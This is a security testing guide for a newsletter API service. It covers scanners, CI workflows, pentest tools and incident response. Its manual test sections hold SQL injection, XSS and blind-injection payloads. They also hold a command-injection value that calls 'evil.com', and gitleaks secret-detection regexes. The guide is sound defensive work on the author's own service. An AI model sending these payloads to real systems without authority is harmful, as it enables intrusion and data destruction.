# Newsletter Backend Service - Security Testing Guide

## Table of Contents

1. [Overview](#overview)
2. [Security Testing Strategy](#security-testing-strategy)
3. [Automated Security Tools](#automated-security-tools)
4. [Manual Security Testing](#manual-security-testing)
5. [Penetration Testing Procedures](#penetration-testing-procedures)
6. [Security Checklist](#security-checklist)
7. [Vulnerability Assessment](#vulnerability-assessment)
8. [CI/CD Security Integration](#cicd-security-integration)
9. [Security Monitoring](#security-monitoring)
10. [Incident Response](#incident-response)

## Overview

This guide provides comprehensive security testing procedures for the Newsletter Backend Service, including automated tools, manual testing procedures, and guidelines for external penetration testing.

### Security Objectives

- **Data Protection**: Secure handling of subscriber email addresses and PII
- **Access Control**: Proper authentication and authorization
- **Input Validation**: Protection against injection attacks
- **Communication Security**: Secure data transmission
- **Infrastructure Security**: Secure deployment and configuration

### Threat Model

**Assets**:
- Subscriber email addresses (PII)
- Authentication tokens and secrets
- System availability and integrity
- Email delivery reputation

**Threats**:
- Data breaches and unauthorized access
- Injection attacks (SQL, XSS, etc.)
- Bot attacks and spam
- DDoS and availability attacks
- Token manipulation and replay attacks

## Security Testing Strategy

### Testing Levels

1. **Static Analysis** - Code review and automated scanning
2. **Dynamic Analysis** - Runtime security testing
3. **Interactive Testing** - Manual security testing
4. **External Testing** - Third-party penetration testing

### Testing Frequency

- **Pre-commit**: Static analysis and basic security checks
- **CI/CD Pipeline**: Automated security scanning
- **Pre-deployment**: Security validation tests
- **Monthly**: Comprehensive security review
- **Quarterly**: External penetration testing

## Automated Security Tools

### 1. Static Application Security Testing (SAST)

#### ESLint Security Plugin

**Installation**:
```bash
npm install --save-dev eslint-plugin-security
```

**Configuration** (`.eslintrc.js`):
```javascript
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-child-process': 'error',
    'security/detect-disable-mustache-escape': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-non-literal-fs-filename': 'error',
    'security/detect-non-literal-require': 'error',
    'security/detect-possible-timing-attacks': 'error',
    'security/detect-pseudoRandomBytes': 'error'
  }
};
```

**Usage**:
```bash
# Run security linting
npx eslint src/ --ext .ts,.js

# Add to package.json scripts
npm run lint:security
```

#### Semgrep (Free SAST Tool)

**Installation**:
```bash
# Install Semgrep
pip install semgrep

# Or use Docker
docker pull returntocorp/semgrep
```

**Configuration** (`.semgrep.yml`):
```yaml
rules:
  - id: hardcoded-secrets
    pattern: |
      $SECRET = "..."
    message: Potential hardcoded secret detected
    languages: [typescript, javascript]
    severity: ERROR
    
  - id: sql-injection
    pattern: |
      $DB.prepare($QUERY + $INPUT)
    message: Potential SQL injection vulnerability
    languages: [typescript, javascript]
    severity: ERROR
    
  - id: weak-crypto
    pattern: |
      crypto.createHash("md5")
    message: Weak cryptographic algorithm detected
    languages: [typescript, javascript]
    severity: WARNING
```

**Usage**:
```bash
# Run Semgrep security scan
semgrep --config=auto src/

# Run with custom rules
semgrep --config=.semgrep.yml src/

# Generate report
semgrep --config=auto --json --output=security-report.json src/
```

#### CodeQL (GitHub Security)

**Setup** (`.github/workflows/codeql.yml`):
```yaml
name: "CodeQL Security Analysis"

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * 1'  # Weekly on Monday

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write

    strategy:
      fail-fast: false
      matrix:
        language: [ 'javascript' ]

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Initialize CodeQL
      uses: github/codeql-action/init@v2
      with:
        languages: ${{ matrix.language }}
        queries: security-and-quality

    - name: Autobuild
      uses: github/codeql-action/autobuild@v2

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v2
```

### 2. Dependency Vulnerability Scanning

#### npm audit

**Usage**:
```bash
# Check for vulnerabilities
npm audit

# Fix automatically where possible
npm audit fix

# Generate detailed report
npm audit --json > dependency-vulnerabilities.json

# Check for high/critical only
npm audit --audit-level high
```

#### Snyk (Free for Open Source)

**Installation**:
```bash
npm install -g snyk
```

**Usage**:
```bash
# Authenticate (free account)
snyk auth

# Test for vulnerabilities
snyk test

# Monitor project
snyk monitor

# Test Docker images
snyk test --docker

# Generate report
snyk test --json > snyk-report.json
```

#### OWASP Dependency Check

**Installation**:
```bash
# Download dependency-check
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.4.0/dependency-check-8.4.0-release.zip
unzip dependency-check-8.4.0-release.zip
```

**Usage**:
```bash
# Scan project dependencies
./dependency-check/bin/dependency-check.sh \
  --project "Newsletter Service" \
  --scan ./package.json \
  --format JSON \
  --out ./security-reports/

# HTML report
./dependency-check/bin/dependency-check.sh \
  --project "Newsletter Service" \
  --scan ./package.json \
  --format HTML \
  --out ./security-reports/
```

### 3. Container Security Scanning

#### Trivy (Free Container Scanner)

**Installation**:
```bash
# Install Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
```

**Usage**:
```bash
# Scan filesystem
trivy fs .

# Scan for secrets
trivy fs --scanners secret .

# Generate report
trivy fs --format json --output trivy-report.json .

# Scan specific files
trivy fs --scanners secret,vuln package.json
```

### 4. Secret Detection

#### GitLeaks

**Installation**:
```bash
# Install gitleaks
brew install gitleaks
# or
curl -sSfL https://raw.githubusercontent.com/gitleaks/gitleaks/master/scripts/install.sh | sh
```

**Configuration** (`.gitleaks.toml`):
```toml
title = "Newsletter Service Security Scan"

[[rules]]
id = "generic-api-key"
description = "Generic API Key"
regex = '''(?i)api[_-]?key[_-]?[=:]\s*['""]?[a-z0-9]{20,}['""]?'''
tags = ["key", "API"]

[[rules]]
id = "cloudflare-api-key"
description = "Cloudflare API Key"
regex = '''[a-z0-9]{37}'''
tags = ["key", "Cloudflare"]

[[rules]]
id = "email-password"
description = "Email Password"
regex = '''(?i)password[_-]?[=:]\s*['""]?[a-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]{8,}['""]?'''
tags = ["password"]

[allowlist]
paths = [
  '''\.env\.example$''',
  '''docs/.*\.md$''',
  '''tests/.*\.test\.ts$'''
]
```

**Usage**:
```bash
# Scan repository
gitleaks detect --source . --verbose

# Scan with custom config
gitleaks detect --config .gitleaks.toml --source .

# Scan git history
gitleaks detect --source . --log-opts="--since='2023-01-01'"

# Generate report
gitleaks detect --source . --report-format json --report-path gitleaks-report.json
```

#### TruffleHog

**Installation**:
```bash
# Install trufflehog
pip install trufflehog3
```

**Usage**:
```bash
# Scan repository
trufflehog3 .

# Scan with custom rules
trufflehog3 --rules custom-rules.json .

# Scan specific files
trufflehog3 --include="*.ts,*.js" .
```

## Manual Security Testing

### 1. Authentication and Authorization Testing

#### API Key Security

**Test Cases**:
```bash
# Test 1: Missing API key
curl https://api.rnwolf.net/metrics
# Expected: 401 Unauthorized

# Test 2: Invalid API key
curl -H "Authorization: Bearer invalid-key" \
  https://api.rnwolf.net/metrics
# Expected: 401 Unauthorized

# Test 3: Malformed authorization header
curl -H "Authorization: invalid-format" \
  https://api.rnwolf.net/metrics
# Expected: 401 Unauthorized

# Test 4: SQL injection in API key
curl -H "Authorization: Bearer '; DROP TABLE subscribers; --" \
  https://api.rnwolf.net/metrics
# Expected: 401 Unauthorized (no SQL execution)
```

#### Token Validation Testing

**HMAC Token Security**:
```bash
# Test 1: Invalid token format
curl "https://api.rnwolf.net/v1/newsletter/verify?token=invalid&email=test@example.com"
# Expected: 400 Bad Request

# Test 2: Expired token (manual generation with old timestamp)
# Generate old token and test
curl "https://api.rnwolf.net/v1/newsletter/verify?token=<old-token>&email=test@example.com"
# Expected: 400 Bad Request

# Test 3: Token for different email
curl "https://api.rnwolf.net/v1/newsletter/verify?token=<valid-token>&email=different@example.com"
# Expected: 400 Bad Request

# Test 4: Token manipulation
curl "https://api.rnwolf.net/v1/newsletter/verify?token=<token>modified&email=test@example.com"
# Expected: 400 Bad Request
```

### 2. Input Validation Testing

#### Email Validation

**Test Script** (`scripts/test-email-validation.sh`):
```bash
#!/bin/bash

API_URL="https://api.rnwolf.net"

echo "=== Email Validation Security Tests ==="

# Test cases for email validation
test_emails=(
  ""                                    # Empty email
  "invalid-email"                       # Invalid format
  "test@"                              # Incomplete domain
  "@domain.com"                        # Missing local part
  "test..test@domain.com"              # Double dots
  "test@domain"                        # Missing TLD
  "test@domain..com"                   # Double dots in domain
  "test space@domain.com"              # Space in email
  "test@domain .com"                   # Space in domain
  "$(echo -e 'test@domain.com\nmalicious')" # Newline injection
  "test@domain.com'; DROP TABLE subscribers; --" # SQL injection attempt
  "<script>alert('xss')</script>@domain.com"     # XSS attempt
  "test@domain.com$(curl evil.com)"              # Command injection
  "A"*255"@domain.com"                          # Extremely long email
)

for email in "${test_emails[@]}"; do
  echo "Testing: $email"
  response=$(curl -s -X POST "$API_URL/v1/newsletter/subscribe" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\"}")
  
  echo "Response: $response"
  echo "---"
done
```

#### SQL Injection Testing

**Test Cases**:
```bash
# Test 1: SQL injection in email parameter
curl -X POST https://api.rnwolf.net/v1/newsletter/subscribe \
  -H "Content-Type: application/json" \
  -d '{"email": "test@domain.com'\'''; DROP TABLE subscribers; --"}'

# Test 2: SQL injection in verification
curl "https://api.rnwolf.net/v1/newsletter/verify?email=test@domain.com'%20OR%201=1%20--&token=test"

# Test 3: Boolean-based blind SQL injection
curl "https://api.rnwolf.net/v1/newsletter/verify?email=test@domain.com'%20AND%201=1%20--&token=test"
curl "https://api.rnwolf.net/v1/newsletter/verify?email=test@domain.com'%20AND%201=2%20--&token=test"

# Test 4: Time-based blind SQL injection
curl "https://api.rnwolf.net/v1/newsletter/verify?email=test@domain.com'%20AND%20(SELECT%20COUNT(*)%20FROM%20sqlite_master)%20--&token=test"
```

### 3. Cross-Site Scripting (XSS) Testing

**Test Cases**:
```bash
# Test 1: Reflected XSS in error messages
curl "https://api.rnwolf.net/v1/newsletter/verify?email=<script>alert('xss')</script>&token=test"

# Test 2: XSS in email parameter
curl -X POST https://api.rnwolf.net/v1/newsletter/subscribe \
  -H "Content-Type: application/json" \
  -d '{"email": "<img src=x onerror=alert(1)>@domain.com"}'

# Test 3: XSS in HTML responses
curl "https://api.rnwolf.net/v1/newsletter/unsubscribe?email=<script>alert('xss')</script>&token=test"
```

### 4. Cross-Site Request Forgery (CSRF) Testing

**Test Cases**:
```bash
# Test 1: CSRF protection on state-changing operations
curl -X POST https://api.rnwolf.net/v1/newsletter/subscribe \
  -H "Origin: https://malicious-site.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@example.com"}'

# Test 2: Check CORS headers
curl -H "Origin: https://malicious-site.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -X OPTIONS https://api.rnwolf.net/v1/newsletter/subscribe
```

### 5. Rate Limiting and DoS Testing

**Test Script** (`scripts/test-rate-limiting.sh`):
```bash
#!/bin/bash

API_URL="https://api.rnwolf.net"

echo "=== Rate Limiting Tests ==="

# Test rapid requests
for i in {1..100}; do
  echo "Request $i"
  curl -s -X POST "$API_URL/v1/newsletter/subscribe" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"test$i@example.com\"}" &
done

wait
echo "Rate limiting test completed"

# Test large payload
echo "=== Large Payload Test ==="
large_email=$(python3 -c "print('a' * 10000 + '@domain.com')")
curl -X POST "$API_URL/v1/newsletter/subscribe" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$large_email\"}"
```

## Penetration Testing Procedures

### External Penetration Testing Checklist

#### Pre-Testing Setup

**Scope Definition**:
- **In Scope**: 
  - api.rnwolf.net (production)
  - api-staging.rnwolf.net (staging)
  - All API endpoints
  - Database interactions
  
- **Out of Scope**:
  - Physical infrastructure
  - Social engineering
  - Third-party services (MailChannels, Cloudflare)

**Testing Windows**:
- **Staging**: Anytime
- **Production**: Scheduled maintenance windows only

#### Testing Methodology

**1. Information Gathering**:
```bash
# DNS enumeration
dig api.rnwolf.net
nslookup api.rnwolf.net

# Subdomain discovery
sublist3r -d rnwolf.net

# Technology fingerprinting
whatweb https://api.rnwolf.net
wappalyzer https://api.rnwolf.net

# SSL/TLS analysis
sslscan api.rnwolf.net
testssl.sh api.rnwolf.net
```

**2. Vulnerability Scanning**:
```bash
# Web application scanning
nikto -h https://api.rnwolf.net

# OWASP ZAP scanning
zap-baseline.py -t https://api.rnwolf.net

# Custom vulnerability scanning
nuclei -u https://api.rnwolf.net -t cves/
```

**3. Manual Testing**:
- Authentication bypass attempts
- Authorization flaws
- Input validation testing
- Business logic flaws
- Session management issues

### Automated Penetration Testing Tools

#### OWASP ZAP

**Installation**:
```bash
# Download and install OWASP ZAP
wget https://github.com/zaproxy/zaproxy/releases/download/v2.12.0/ZAP_2_12_0_unix.sh
chmod +x ZAP_2_12_0_unix.sh
./ZAP_2_12_0_unix.sh
```

**Automated Scan**:
```bash
# Baseline scan
zap-baseline.py -t https://api.rnwolf.net -r zap-baseline-report.html

# Full scan
zap-full-scan.py -t https://api.rnwolf.net -r zap-full-report.html

# API scan
zap-api-scan.py -t https://api.rnwolf.net/openapi.json -f openapi -r zap-api-report.html
```

#### Nuclei

**Installation**:
```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

**Usage**:
```bash
# Update templates
nuclei -update-templates

# Scan for vulnerabilities
nuclei -u https://api.rnwolf.net

# Scan with specific templates
nuclei -u https://api.rnwolf.net -t cves/ -t vulnerabilities/

# Generate report
nuclei -u https://api.rnwolf.net -o nuclei-report.txt
```

#### SQLMap

**Installation**:
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

**Usage**:
```bash
# Test for SQL injection
python sqlmap.py -u "https://api.rnwolf.net/v1/newsletter/verify?email=test@example.com&token=test" --batch

# Test POST parameters
python sqlmap.py -u "https://api.rnwolf.net/v1/newsletter/subscribe" \
  --data='{"email":"test@example.com"}' \
  --headers="Content-Type: application/json" \
  --batch
```

## Security Checklist

### Pre-Deployment Security Checklist

- [ ] **Static Analysis**: All SAST tools pass
- [ ] **Dependency Scan**: No high/critical vulnerabilities
- [ ] **Secret Detection**: No hardcoded secrets
- [ ] **Input Validation**: All inputs properly validated
- [ ] **Authentication**: Proper authentication implemented
- [ ] **Authorization**: Access controls in place
- [ ] **HTTPS**: All communications encrypted
- [ ] **CORS**: Proper CORS configuration
- [ ] **Error Handling**: No sensitive information in errors
- [ ] **Logging**: Security events logged appropriately

### Runtime Security Checklist

- [ ] **Rate Limiting**: Protection against abuse
- [ ] **Bot Protection**: Turnstile properly configured
- [ ] **Database Security**: Parameterized queries used
- [ ] **Token Security**: HMAC tokens properly validated
- [ ] **Session Management**: Secure session handling
- [ ] **Data Protection**: PII properly protected
- [ ] **Monitoring**: Security monitoring in place
- [ ] **Incident Response**: Response procedures defined

### Infrastructure Security Checklist

- [ ] **Environment Isolation**: Proper environment separation
- [ ] **Secret Management**: Secrets properly stored
- [ ] **Access Control**: Least privilege access
- [ ] **Network Security**: Proper network configuration
- [ ] **Backup Security**: Secure backup procedures
- [ ] **Update Management**: Regular security updates
- [ ] **Monitoring**: Infrastructure monitoring
- [ ] **Compliance**: Regulatory compliance met

## Vulnerability Assessment

### Vulnerability Classification

**Critical (CVSS 9.0-10.0)**:
- Remote code execution
- SQL injection with data access
- Authentication bypass

**High (CVSS 7.0-8.9)**:
- Privilege escalation
- Sensitive data exposure
- Cross-site scripting (stored)

**Medium (CVSS 4.0-6.9)**:
- Cross-site scripting (reflected)
- Information disclosure
- Weak authentication

**Low (CVSS 0.1-3.9)**:
- Information leakage
- Weak encryption
- Missing security headers

### Vulnerability Tracking

**Vulnerability Report Template**:
```markdown
## Vulnerability Report

**ID**: VUL-2024-001
**Title**: [Vulnerability Title]
**Severity**: [Critical/High/Medium/Low]
**CVSS Score**: [0.0-10.0]

### Description
[Detailed description of the vulnerability]

### Impact
[Potential impact if exploited]

### Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Evidence
[Screenshots, logs, or other evidence]

### Remediation
[Recommended fix or mitigation]

### Timeline
- **Discovered**: [Date]
- **Reported**: [Date]
- **Fixed**: [Date]
- **Verified**: [Date]
```

## CI/CD Security Integration

### GitHub Actions Security Workflow

**Security Pipeline** (`.github/workflows/security.yml`):
```yaml
name: Security Testing

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * 1'  # Weekly

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0  # Full history for secret scanning
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: ESLint Security Scan
      run: npm run lint:security
    
    - name: Dependency Vulnerability Scan
      run: npm audit --audit-level high
    
    - name: Semgrep Security Scan
      uses: returntocorp/semgrep-action@v1
      with:
        config: auto
    
    - name: Secret Detection with GitLeaks
      uses: gitleaks/gitleaks-action@v2
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    
    - name: Trivy Filesystem Scan
      uses: aquasecurity/trivy-action@master
      with:
        scan-type: 'fs'
        scan-ref: '.'
        format: 'sarif'
        output: 'trivy-results.sarif'
    
    - name: Upload Trivy Results
      uses: github/codeql-action/upload-sarif@v2
      with:
        sarif_file: 'trivy-results.sarif'
    
    - name: Security Test Results
      if: always()
      uses: actions/upload-artifact@v3
      with:
        name: security-results
        path: |
          trivy-results.sarif
          semgrep-results.json
```

### Pre-commit Security Hooks

**Setup** (`.pre-commit-config.yaml`):
```yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
  
  - repo: https://github.com/zricethezav/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
  
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.45.0
    hooks:
      - id: semgrep
        args: ['--config=auto']
```

**Installation**:
```bash
pip install pre-commit
pre-commit install
```

## Security Monitoring

### Security Metrics

**Key Security Metrics**:
- Authentication failure rate
- Invalid input attempts
- Rate limiting triggers
- Error rate by endpoint
- Suspicious IP addresses

**Grafana Security Dashboard**:
```json
{
  "dashboard": {
    "title": "Security Monitoring",
    "panels": [
      {
        "title": "Authentication Failures",
        "type": "stat",
        "targets": [
          {
            "expr": "rate(http_requests_total{status=\"401\"}[5m])"
          }
        ]
      },
      {
        "title": "Input Validation Errors",
        "type": "stat",
        "targets": [
          {
            "expr": "rate(http_requests_total{status=\"400\"}[5m])"
          }
        ]
      }
    ]
  }
}
```

### Security Alerting

**Alert Rules**:
```yaml
groups:
  - name: security
    rules:
      - alert: HighAuthenticationFailureRate
        expr: rate(http_requests_total{status="401"}[5m]) > 0.1
        for: 2m
        labels:
          severity: warning
        annotations:
          summary: "High authentication failure rate detected"
      
      - alert: SuspiciousInputPatterns
        expr: rate(http_requests_total{status="400"}[5m]) > 0.2
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "High rate of input validation errors"
```

## Incident Response

### Security Incident Response Plan

**1. Detection and Analysis**:
- Monitor security alerts
- Analyze suspicious activities
- Determine incident severity

**2. Containment**:
- Isolate affected systems
- Preserve evidence
- Implement temporary fixes

**3. Eradication and Recovery**:
- Remove threats
- Apply permanent fixes
- Restore normal operations

**4. Post-Incident Activities**:
- Document lessons learned
- Update security measures
- Improve monitoring

### Security Incident Playbooks

**Data Breach Response**:
```bash
#!/bin/bash
# security-incident-response.sh

echo "=== Security Incident Response ==="
echo "Timestamp: $(date)"

# 1. Immediate containment
echo "1. Checking system status..."
curl -s https://api.rnwolf.net/health

# 2. Preserve evidence
echo "2. Collecting logs..."
wrangler tail --env production > incident-logs-$(date +%Y%m%d-%H%M%S).log &
TAIL_PID=$!

# 3. Check for unauthorized access
echo "3. Checking recent activity..."
curl -H "Authorization: Bearer $GRAFANA_API_KEY" \
  https://api.rnwolf.net/metrics/json > incident-metrics-$(date +%Y%m%d-%H%M%S).json

# 4. Database integrity check
echo "4. Checking database integrity..."
wrangler d1 execute DB --env production --command="PRAGMA integrity_check;" > db-integrity-$(date +%Y%m%d-%H%M%S).log

# 5. Stop log collection
sleep 60
kill $TAIL_PID

echo "Initial response completed. Evidence collected."
echo "Next steps: Analyze evidence and determine containment measures."
```

## Related Documentation

- **[API Reference](api-reference.md)**: API security considerations
- **[Architecture Overview](architecture-overview.md)**: Security architecture
- **[Deployment Runbook](deployment-runbook.md)**: Secure deployment procedures
- **[Troubleshooting Guide](troubleshooting-guide.md)**: Security issue resolution

## Security Resources

### External Security Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP API Security**: https://owasp.org/www-project-api-security/
- **Cloudflare Security**: https://developers.cloudflare.com/security/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework

### Security Training

- **OWASP WebGoat**: Hands-on security training
- **PortSwigger Web Security Academy**: Free web security training
- **Cloudflare Learning Center**: Security best practices

### Security Communities

- **OWASP Local Chapters**: Local security meetups
- **DEF CON Groups**: Security conferences and training
- **Security Twitter**: Follow security researchers and news